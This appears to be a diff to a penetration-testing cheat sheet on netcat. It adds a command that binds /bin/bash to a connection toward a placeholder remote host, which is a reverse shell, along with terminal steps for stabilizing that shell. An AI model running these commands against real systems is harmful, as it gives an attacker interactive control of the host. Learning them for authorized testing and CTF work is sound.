@@ -11,3 +11,22 @@ nc -nlvp <LPORT>
 ```
 nc <RHOST> <RPORT>
 ```
+
+Use `-e` to link the connection to a program 
+```
+nc -e /bin/bash <RHOST> <RPORT>
+```
+
+
+## Stabilize Reverse Shell
+
+```
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+Ctrl z
+stty raw -echo; fg
+```
+
+## Links
+
+[Stabilize a reverse shell](https://tkcyber.com/index.php/2022/06/19/stabilize-a-reverse-shell/)
